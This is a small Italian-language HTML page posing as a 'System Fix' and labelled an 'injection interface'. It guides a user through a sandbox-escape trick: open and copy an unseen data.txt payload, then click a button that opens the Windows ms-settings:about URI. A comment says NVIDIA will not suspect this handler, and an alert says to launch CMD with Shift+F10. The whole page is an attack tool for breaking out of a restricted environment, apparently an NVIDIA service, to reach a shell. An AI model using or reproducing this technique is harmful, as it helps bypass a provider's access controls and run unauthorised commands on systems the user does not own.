<!DOCTYPE html>
<html>
<head><title>System Fix</title></head>
<body style="background:#000; color:#0f0; font-family:monospace; text-align:center;">
    <h1>[ JANUS INJECTION INTERFACE ]</h1>
    <p>1. Clicca il tasto per aprire il codice.</p>
    <a href="data.txt" target="_blank" style="color:#0f0; font-size:20px;">APRI SORGENTE</a>
    
    <p>2. Una volta aperto, copia tutto (CTRL+A, CTRL+C).</p>
    <p>3. Torna qui e premi il tasto sotto per iniettare.</p>
    
    <button onclick="inject()" style="padding:20px; background:#0f0;">ESEGUI INIEZIONE</button>

    <script>
        function inject() {
            // Usiamo un URI handler che NVIDIA non sospetta
            const cmd = "ms-settings:about"; 
            window.location.href = cmd;
            alert("Sfrutta la finestra ms-settings per lanciare CMD (Shift+F10)");
        }
    </script>
</body>
</html>
